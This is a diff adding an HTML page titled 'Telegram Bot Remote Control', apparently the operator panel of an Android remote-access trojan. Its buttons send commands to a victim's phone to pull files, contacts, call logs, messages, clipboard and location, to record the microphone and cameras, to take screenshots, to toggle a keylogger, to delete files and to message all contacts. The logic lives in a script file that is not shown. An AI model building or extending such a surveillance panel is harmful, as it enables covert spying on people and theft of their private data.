@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Bot Remote Control</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h2>Telegram Bot Remote Control</h2>
+        <button class="action-btn" onclick="sendAction('apps')">Apps</button>
+        <button class="action-btn" onclick="sendAction('device_info')">Device Info</button>
+        <button class="action-btn" onclick="sendAction('file')">Get File</button>
+        <button class="action-btn" onclick="sendAction('delete_file')">Delete File</button>
+        <button class="action-btn" onclick="sendAction('clipboard')">Clipboard</button>
+        <button class="action-btn" onclick="sendAction('microphone')">Microphone</button>
+        <button class="action-btn" onclick="sendAction('camera_main')">Main Camera</button>
+        <button class="action-btn" onclick="sendAction('camera_selfie')">Selfie Camera</button>
+        <button class="action-btn" onclick="sendAction('rec_camera_main')">Record Main Camera</button>
+        <button class="action-btn" onclick="sendAction('rec_camera_selfie')">Record Selfie Camera</button>
+        <button class="action-btn" onclick="sendAction('location')">Location</button>
+        <button class="action-btn" onclick="sendAction('toast')">Toast</button>
+        <button class="action-btn" onclick="sendAction('calls')">Calls</button>
+        <button class="action-btn" onclick="sendAction('contacts')">Contacts</button>
+        <button class="action-btn" onclick="sendAction('vibrate')">Vibrate</button>
+        <button class="action-btn" onclick="sendAction('show_notification')">Show Notification</button>
+        <button class="action-btn" onclick="sendAction('messages')">Messages</button>
+        <button class="action-btn" onclick="sendAction('send_message')">Send Message</button>
+        <button class="action-btn" onclick="sendAction('play_audio')">Play Audio</button>
+        <button class="action-btn" onclick="sendAction('stop_audio')">Stop Audio</button>
+        <button class="action-btn" onclick="sendAction('screenshot')">Screenshot</button>
+        <button class="action-btn" onclick="sendAction('torch_on')">Torch On</button>
+        <button class="action-btn" onclick="sendAction('torch_off')">Torch Off</button>
+        <button class="action-btn" onclick="sendAction('keylogger_on')">Keylogger On</button>
+        <button class="action-btn" onclick="sendAction('keylogger_off')">Keylogger Off</button>
+        <button class="action-btn" onclick="sendAction('open_target_link')">Open Target Link</button>
+        <button class="action-btn" onclick="sendAction('text_to_speech')">Text to Speech</button>
+        <button class="action-btn" onclick="sendAction('send_message_to_all')">Send Message to All</button>
+        <button class="action-btn" onclick="sendAction('device_button')">Device Buttons</button>
+        <button class="action-btn" onclick="sendAction('storage_permission')">Grant Storage Permission</button>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
